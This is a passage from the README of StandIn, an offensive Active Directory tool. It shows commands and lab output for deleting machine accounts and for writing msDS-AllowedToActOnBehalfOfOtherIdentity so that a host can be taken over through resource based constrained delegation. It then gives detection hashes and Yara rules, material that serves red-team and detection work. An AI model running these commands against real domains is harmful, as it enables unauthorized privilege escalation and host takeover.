    Path     : LDAP://CN=M-1337-b33f,CN=Computers,DC=main,DC=redhook,DC=local

[+] Machine account currently enabled
    |_ Account disabled..
```

### Delete machine object

#### Use Case

> *With elevated AD privileges the operator can delete a machine object, such as once create earlier in the attack chain.*

#### Syntax

Use an elevated context to delete a machine object.

```
C:\> StandIn.exe --computer M-1337-b33f --delete

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=M-1337-b33f
    Path     : LDAP://CN=M-1337-b33f,CN=Computers,DC=main,DC=redhook,DC=local

[+] Machine account deleted from AD
```

### Add msDS-AllowedToActOnBehalfOfOtherIdentity

#### Use Case

> *With write access to a machine object this function allows the operator to add an `msDS-AllowedToActOnBehalfOfOtherIdentity` property to the machine which is required to perform a [resource based constrained delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) attack.*

#### Syntax

Add an `msDS-AllowedToActOnBehalfOfOtherIdentity` propert to the machine along with a SID to facilitate host takeover using resource based constrained delegation.

```
C:\> StandIn.exe --computer m-10-1909-03 --sid S-1-5-21-1293271031-3053586410-2290657902-1205

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=M-10-1909-03
    Path     : LDAP://CN=M-10-1909-03,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local
[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity

C:\> StandIn.exe --object samaccountname=m-10-1909-03$

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=M-10-1909-03
    Path     : LDAP://CN=M-10-1909-03,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local

[?] Iterating object properties

[+] logoncount
    |_ 107
[+] codepage
    |_ 0
[+] objectcategory
    |_ CN=Computer,CN=Schema,CN=Configuration,DC=main,DC=redhook,DC=local
[+] iscriticalsystemobject
    |_ False
[+] operatingsystem
    |_ Windows 10 Enterprise
[+] usnchanged
    |_ 195771
[+] instancetype
    |_ 4
[+] name
    |_ M-10-1909-03
[+] badpasswordtime
    |_ 7/9/2020 5:07:11 PM UTC
[+] pwdlastset
    |_ 10/29/2020 6:44:08 PM UTC
[+] serviceprincipalname
    |_ TERMSRV/M-10-1909-03
    |_ TERMSRV/m-10-1909-03.main.redhook.local
    |_ WSMAN/m-10-1909-03
    |_ WSMAN/m-10-1909-03.main.redhook.local
    |_ RestrictedKrbHost/M-10-1909-03
    |_ HOST/M-10-1909-03
    |_ RestrictedKrbHost/m-10-1909-03.main.redhook.local
    |_ HOST/m-10-1909-03.main.redhook.local
[+] objectclass
    |_ top
    |_ person
    |_ organizationalPerson
    |_ user
    |_ computer
[+] badpwdcount
    |_ 0
[+] samaccounttype
    |_ SAM_MACHINE_ACCOUNT
[+] lastlogontimestamp
    |_ 10/29/2020 12:29:26 PM UTC
[+] usncreated
    |_ 31127
[+] objectguid
    |_ c02cff97-4bfd-457c-a568-a748b0725c2f
[+] localpolicyflags
    |_ 0
[+] whencreated
    |_ 7/9/2020 5:05:08 PM
[+] adspath
    |_ LDAP://CN=M-10-1909-03,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local
[+] useraccountcontrol
    |_ WORKSTATION_TRUST_ACCOUNT
[+] cn
    |_ M-10-1909-03
[+] countrycode
    |_ 0
[+] primarygroupid
    |_ 515
[+] whenchanged
    |_ 11/2/2020 7:55:14 PM
[+] operatingsystemversion
    |_ 10.0 (18363)
[+] dnshostname
    |_ m-10-1909-03.main.redhook.local
[+] dscorepropagationdata
    |_ 10/30/2020 6:56:30 PM
    |_ 10/30/2020 10:55:22 AM
    |_ 10/29/2020 4:58:51 PM
    |_ 10/29/2020 4:58:29 PM
    |_ 1/1/1601 12:00:01 AM
[+] lastlogon
    |_ 11/2/2020 9:07:20 AM UTC
[+] distinguishedname
    |_ CN=M-10-1909-03,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local
[+] msds-supportedencryptiontypes
    |_ RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[+] samaccountname
    |_ M-10-1909-03$
[+] objectsid
    |_ S-1-5-21-1293271031-3053586410-2290657902-1127
[+] lastlogoff
    |_ 0
[+] msds-allowedtoactonbehalfofotheridentity
    |_ BinLen           : 36
    |_ AceQualifier     : AccessAllowed
    |_ IsCallback       : False
    |_ OpaqueLength     : 0
    |_ AccessMask       : 983551
    |_ SID              : S-1-5-21-1293271031-3053586410-2290657902-1205
    |_ AceType          : AccessAllowed
    |_ AceFlags         : None
    |_ IsInherited      : False
    |_ InheritanceFlags : None
    |_ PropagationFlags : None
    |_ AuditFlags       : None
[+] accountexpires
    |_ 0x7FFFFFFFFFFFFFFF
```

### Remove msDS-AllowedToActOnBehalfOfOtherIdentity

#### Use Case

> *With write access to a machine object this function allows the operator to remove a previously added `msDS-AllowedToActOnBehalfOfOtherIdentity` property from the machine.*

#### Syntax

Remove previously created `msDS-AllowedToActOnBehalfOfOtherIdentity` property from a machine.

```
C:\> StandIn.exe --computer m-10-1909-03 --remove

[?] Using DC : m-w16-dc01.main.redhook.local
[?] Object   : CN=M-10-1909-03
    Path     : LDAP://CN=M-10-1909-03,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local
[+] msDS-AllowedToActOnBehalfOfOtherIdentity property removed..
```

## Detection

This section will outline a number of IOC which can aid the detection engineering process for StandIn.

#### Release Package Hashes

The following table maps the release package hashes for StandIn.

```
-=v0.8=-
StandIn_Net35.exe    SHA256: A0B3C96CA89770ED04E37D43188427E0016B42B03C0102216C5F6A785B942BD3
                        MD5: 8C942EE4553E40A7968FF0C8DC5DB9AB

StandIn_Net45.exe    SHA256: F80AEB33FC53F2C8D6313A6B20CD117739A71382C208702B43073D54C9ACA681
                        MD5: 9E0FC3159A6BF8C3A8A0FAA76F6F74F9

-=v0.7=-
StandIn_Net35.exe    SHA256: A1ECD50DA8AAE5734A5F5C4A6A951B5F3C99CC4FB939AC60EF5EE19896CA23A0
                        MD5: 50D29F7597BF83D80418DEEFD360F093

StandIn_Net45.exe    SHA256: DBAB7B9CC694FC37354E3A18F9418586172ED6660D8D205EAFFF945525A6A31A
                        MD5: 4E5258A876ABCD2CA2EF80E0D5D93195
```

#### Yara

The following Yara rules can be used to detect StandIn on disk, in it's default form.

```js
rule StandIn
{
    meta:
        author = "Ruben Boonen (@FuzzySec)"
        description = "Detect StandIn string constants."

    strings:
        $s1 = "StandIn" ascii wide nocase
        $s2 = "(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))" ascii wide nocase
        $s3 = "msDS-AllowedToActOnBehalfOfOtherIdentity" ascii wide nocase
        $s4 = ">--~~--> Args? <--~~--<" ascii wide nocase

    condition:
        all of ($s*)
}

rule StandIn_PDB
{
    meta:
        author = "Ruben Boonen (@FuzzySec)"
        description = "Detect StandIn default PDB."

    strings:
        $s1 = "\\Release\\StandIn.pdb" ascii wide nocase
	
    condition:
        all of ($s*)
}
```

#### SilktETW Microsoft-Windows-DotNETRuntime Yara Rule

The Yara rule below can be used to detect StandIn when execution happens from memory. To use this rule, the EDR solution will require access to the `Microsoft-Windows-DotNETRuntime` ETW data provider. For testing purposes, this rule can be directly evaluated using [SilkETW](https://github.com/fireeye/SilkETW). It should be noted that this is a generic example rule, production alerting would required a more granular approach.

```js
rule Silk_StandIn_Generic
{
    meta:
        author = "Ruben Boonen (@FuzzySec)"
        description = "Generic Microsoft-Windows-DotNETRuntime detection for StandIn."

    strings:
        $s1 = "\\r\\nFullyQualifiedAssemblyName=0;\\r\\nClrInstanceID=StandIn" ascii wide nocase
        $s2 = "MethodFlags=Jitted;\\r\\nMethodNamespace=StandIn." ascii wide nocase

    condition:
        any of them
}
```

![Help](Images/Silk_StandIn.png)